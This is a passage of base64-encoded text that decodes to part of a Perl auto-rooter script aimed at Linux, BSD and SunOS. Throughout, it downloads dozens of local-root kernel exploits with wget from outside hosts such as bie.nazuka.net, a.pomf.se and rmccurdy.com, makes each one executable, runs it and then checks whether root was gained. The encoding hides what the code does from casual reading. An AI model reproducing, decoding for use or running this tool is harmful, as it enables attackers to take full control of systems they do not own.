pOw0Kc3lzdGVtKCIuLzIuNi4yMi02LTg2XzY0LTIwMDciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4yMy0yLjYuMjQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMy0yLjYuMjQiKTsNCnN5c3RlbSgiLi8yLjYuMjMtMi42LjI0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMjMtMi42LjI0XzIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMy0yLjYuMjRfMiIpOw0Kc3lzdGVtKCIuLzIuNi4yMy0yLjYuMjRfMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIzLTIuNi4yNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIzLTIuNi4yNyIpOw0Kc3lzdGVtKCIuLzIuNi4yMy0yLjYuMjciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4yNCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjI0Iik7DQpzeXN0ZW0oIi4vMi42LjI0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMjcuNy1nZW5lcmkiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yNy43LWdlbmVyaSIpOw0Kc3lzdGVtKCIuLzIuNi4yNy43LWdlbmVyaSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjI4LTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yOC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjI4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4zMi00Ni4xLkJIc21wIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzItNDYuMS5CSHNtcCIpOw0Kc3lzdGVtKCIuLzIuNi4zMi00Ni4xLkJIc21wIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuNV9ob29seXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi41X2hvb2x5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi41X2hvb2x5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjYtMzQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi42LTM0Iik7DQpzeXN0ZW0oIi4vMi42LjYtMzQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi42LTM0X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjYtMzRfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oIi4vMi42LjYtMzRfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuNl9oMDBseXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi42X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi42X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjdfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuN19oMDBseXNoaXQiKTsNCnN5c3RlbSgiLi8yLjYuN19oMDBseXNoaXQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi44LTIwMDguOS02Ny0yMDA4Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOC0yMDA4LjktNjctMjAwOCIpOw0Kc3lzdGVtKCIuLzIuNi44LTIwMDguOS02Ny0yMDA4Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOC01X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjgtNV9oMDBseXNoaXQiKTsNCnN5c3RlbSgiLi8yLjYuOC01X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjhfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOF9oMDBseXNoaXQiKTsNCnN5c3RlbSgiLi8yLjYuOF9oMDBseXNoaXQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOSIpOw0Kc3lzdGVtKCIuLzIuNi45Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS0yMDA0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS0yMDA0Iik7DQpzeXN0ZW0oIi4vMi42LjktMjAwNCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjktMjAwOCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjktMjAwOCIpOw0Kc3lzdGVtKCIuLzIuNi45LTIwMDgiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45LTM0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS0zNCIpOw0Kc3lzdGVtKCIuLzIuNi45LTM0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS00Mi4wLjMuRUxzbXAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTQyLjAuMy5FTHNtcCIpOw0Kc3lzdGVtKCIuLzIuNi45LTQyLjAuMy5FTHNtcCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjktNDIuMC4zLkVMc21wLTIwMDYiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTQyLjAuMy5FTHNtcC0yMDA2Iik7DQpzeXN0ZW0oIi4vMi42LjktNDIuMC4zLkVMc21wLTIwMDYiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45LTU1Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS01NSIpOw0Kc3lzdGVtKCIuLzIuNi45LTU1Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS01NS0yMDA3LXBydjgiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTU1LTIwMDctcHJ2OCIpOw0Kc3lzdGVtKCIuLzIuNi45LTU1LTIwMDctcHJ2OCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjktNTUtMjAwOC1wcnY4Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS01NS0yMDA4LXBydjgiKTsNCnN5c3RlbSgiLi8yLjYuOS01NS0yMDA4LXBydjgiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45LTY3MjAwOCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjktNjcyMDA4Iik7DQpzeXN0ZW0oIi4vMi42LjktNjcyMDA4Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS4yIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS4yIik7DQpzeXN0ZW0oIi4vMi42LjkuMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjkxLTIwMDciKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45MS0yMDA3Iik7DQpzeXN0ZW0oIi4vMi42LjkxLTIwMDciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIwMDciKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIwMDciKTsNCnN5c3RlbSgiLi8yMDA3Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMDA5LWxvY2FsIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyMDA5LWxvY2FsIik7DQpzeXN0ZW0oIi4vMjAwOS1sb2NhbCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMjAwOS13dW5kZXJiYXIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIwMDktd3VuZGVyYmFyIik7DQpzeXN0ZW0oIi4vMjAwOS13dW5kZXJiYXIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIxIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyMSIpOw0Kc3lzdGVtKCIuLzIxIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8zIik7DQpzeXN0ZW0oImNobW9kIDc3NyAzIik7DQpzeXN0ZW0oIi4vMyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMy40LjYtOS0yMDA3Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAzLjQuNi05LTIwMDciKTsNCnN5c3RlbSgiLi8zLjQuNi05LTIwMDciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzMxIik7DQpzeXN0ZW0oImNobW9kIDc3NyAzMSIpOw0Kc3lzdGVtKCIuLzMxIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8zNi1yYzEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDM2LXJjMSIpOw0Kc3lzdGVtKCIuLzM2LXJjMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNCIpOw0Kc3lzdGVtKCIuLzQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzQ0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA0NCIpOw0Kc3lzdGVtKCIuLzQ0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC80NyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNDciKTsNCnN5c3RlbSgiLi80NyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNSIpOw0Kc3lzdGVtKCIuLzUiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzUwIik7DQpzeXN0ZW0oImNobW9kIDc3NyA1MCIpOw0Kc3lzdGVtKCIuLzUwIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC81NCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNTQiKTsNCnN5c3RlbSgiLi81NCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNiIpOw0Kc3lzdGVtKCIuLzYiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzY3Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA2NyIpOw0Kc3lzdGVtKCIuLzY3Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC83Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA3Iik7DQpzeXN0ZW0oIi4vNyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNy0yIik7DQpzeXN0ZW0oImNobW9kIDc3NyA3LTIiKTsNCnN5c3RlbSgiLi83LTIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290Lzd4Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA3eCIpOw0Kc3lzdGVtKCIuLzd4Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC84Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA4Iik7DQpzeXN0ZW0oIi4vOCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvOSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgOSIpOw0Kc3lzdGVtKCIuLzkiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzkwIik7DQpzeXN0ZW0oImNobW9kIDc3NyA5MCIpOw0Kc3lzdGVtKCIuLzkwIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC85NCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgOTQiKTsNCnN5c3RlbSgiLi85NCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvTGludXhfMi42LjEyIik7DQpzeXN0ZW0oImNobW9kIDc3NyBMaW51eF8yLjYuMTIiKTsNCnN5c3RlbSgiLi9MaW51eF8yLjYuMTIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L0xpbnV4XzIuNi45LWpvb2x5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgTGludXhfMi42Ljktam9vbHlzaGl0Iik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2FjaWQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGFjaWQiKTsNCnN5c3RlbSgiLi9hY2lkIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9kM3ZpbCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgZDN2aWwiKTsNCnN5c3RlbSgiLi9kM3ZpbCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvZXhwMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMSIpOw0Kc3lzdGVtKCIuL2V4cDEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2V4cDIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGV4cDIiKTsNCnN5c3RlbSgiLi9leHAyIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9leHAzIik7DQpzeXN0ZW0oImNobW9kIDc3NyBleHAzIik7DQpzeXN0ZW0oIi4vZXhwMyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvZXhwbG9pdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdCIpOw0Kc3lzdGVtKCIuL2V4cGxvaXQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2Z1bGwtbmVsc29uIik7DQpzeXN0ZW0oImNobW9kIDc3NyBmdWxsLW5lbHNvbiIpOw0Kc3lzdGVtKCIuL2Z1bGwtbmVsc29uIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9nYXlyb3MiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGdheXJvcyIpOw0Kc3lzdGVtKCIuL2dheXJvcyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvbGVuaXMuc2giKTsNCnN5c3RlbSgiY2htb2QgNzc3IGxlbmlzLnNoIik7DQpzeXN0ZW0oIi4vbGVuaXMuc2giKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2xvY2FsLTIuNi45LTIwMDUtMjAwNiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgbG9jYWwtMi42LjktMjAwNS0yMDA2Iik7DQpzeXN0ZW0oIi4vbG9jYWwtMi42LjktMjAwNS0yMDA2Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9sb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zIik7DQpzeXN0ZW0oImNobW9kIDc3NyBsb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zIik7DQpzeXN0ZW0oIi4vbG9jYWwtcm9vdC1leHBsb2l0LWdheXJvcyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvcHJpdjQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHByaXY0Iik7DQpzeXN0ZW0oIi4vcHJpdjQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3B3bmtlcm5lbCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgcHdua2VybmVsIik7DQpzeXN0ZW0oIi4vcHdua2VybmVsIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9yb290LnB5Iik7DQpzeXN0ZW0oImNobW9kIDc3NyByb290LnB5Iik7DQpzeXN0ZW0oIi4vcm9vdC5weSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvcnVueCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVueCIpOw0Kc3lzdGVtKCIuL3J1bngiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3Rpdm9saSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgdGl2b2xpIik7DQpzeXN0ZW0oIi4vdGl2b2xpIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC91YnVudHUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHVidW50dSIpOw0Kc3lzdGVtKCIuL3VidW50dSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9hLnBvbWYuc2UvdHhmZmd2LnppcCIpOw0Kc3lzdGVtKCJ1bnppcCB0eGZmZ3YuemlwIik7DQpzeXN0ZW0oImNobW9kICt4IHRyb2xsZWQiKTsNCnN5c3RlbSgiLi90cm9sbGVkIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oImNobW9kICt4IDNfWCIpOw0Kc3lzdGVtKCIuLzNfWCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0KDQoNCnByaW50ICJFbmQgTGludXguLiBbK11cbiI7DQp9DQppZiAoJEFSR1ZbMF0gPX4gImJzZCIgKQ0Kew0KcHJpbnQgIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcbiI7DQpwcmludCAiIyBMaW51eC9Cc2QvU3Vub3MgQVVUTy1ST09URVIgICNcbiI7DQpwcmludCAiIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNcbiI7DQpwcmludCAiIyAgICAgICAgSGF2ZSBhIGNvZmZlICAgICAgICAgICNcbiI7DQpwcmludCAiIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNcbiI7DQpwcmludCAiIyAgICAgICBSb290aW5nIEJTRCAgICAgICAgICAgICNcbiI7DQpwcmludCAiIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsNCnN5c3RlbSgidW5hbWUgLWE7bWtkaXIgYnNkO2NkIGJzZCIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2EucG9tZi5zZS9qd2dvYm4uemlwIik7DQpzeXN0ZW0oInVuemlwIGp3Z29ibi56aXAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDQ4bG9jYWwiKTsNCnN5c3RlbSgiLi80OGxvY2FsIik7DQpzeXN0ZW0oImlkIik7DQoNCnN5c3RlbSgiY2htb2QgNzc3IGJzZGxvY2FsIik7DQpzeXN0ZW0oIi4vYnNkbG9jYWwiKTsNCnN5c3RlbSgiaWQiKTsNCg0Kc3lzdGVtKCJjaG1vZCA3NzcgQlNEMy42X2xvY2Fscm9vdCIpOw0Kc3lzdGVtKCIuL0JTRDMuNl9sb2NhbHJvb3QiKTsNCnN5c3RlbSgiaWQiKTsNCg0KDQoNCg0KcHJpbnQgIkVuZCBCc2QuLiBbK11cbiI7DQp9DQppZiAoJEFSR1ZbMF0gPX4gInN1bm9zIiApDQp7DQpwcmludCAiIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsNCnByaW50ICIjIExpbnV4L0JzZC9TdW5vcyBBVVRPLVJPT1RFUiAgI1xuIjsNCnByaW50ICIjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgICBIYXZlIGEgY29mZmUgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgIFJvb3RpbmcgU3Vub3MgICAgICAgICAgI1xuIjsNCnByaW50ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOw0Kc3lzdGVtKCJ1bmFtZSAtYTtta2RpciBzdW5vcztjZCBzdW5vcyIpOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9hLnBvbWYuc2Uva2twZ3ZzLnppcCIpOw0Kc3lzdGVtKCJ1bnppcCBra3BndnMuemlwIik7DQpzeXN0ZW0oImNobW9kIDc3NyB4X29zaC5wbCAiKTsNCnN5c3RlbSgicGVybCB4X29zaC5wbCAiKTsNCnN5c3RlbSgiaWQiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC9TdW5PUyUyMDUuOS9zdW5vczU5Iik7DQpzeXN0ZW0oImNobW9kIDc3NyBzdW5vczU5Iik7DQpzeXN0ZW0oIi4vc3Vub3M1OSIpOw0Kc3lzdGVtKCJpZCIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL3JtY2N1cmR5LmNvbS9zY3JpcHRzL2Rvd25sb2FkZWQvbG9jYWxyb290L1N1bk9TJTIwNS44L2ZpbmFsIik7DQpzeXN0ZW0oImNobW9kIDc3NyBmaW5hbCIpOw0Kc3lzdGVtKCIuL2ZpbmFsIik7DQpzeXN0ZW0oImlkIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvU3VuT1MlMjA1Ljcvc29sYXJpczI3Iik7DQpzeXN0ZW0oImNobW9kICt4IHNvbGFyaXMyNyIpOw0Kc3lzdGVtKCIuL3NvbGFyaXMyNyIpOw0Kc3lzdGVtKCJpZCIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL3JtY2N1cmR5LmNvbS9zY3JpcHRzL2Rvd25sb2F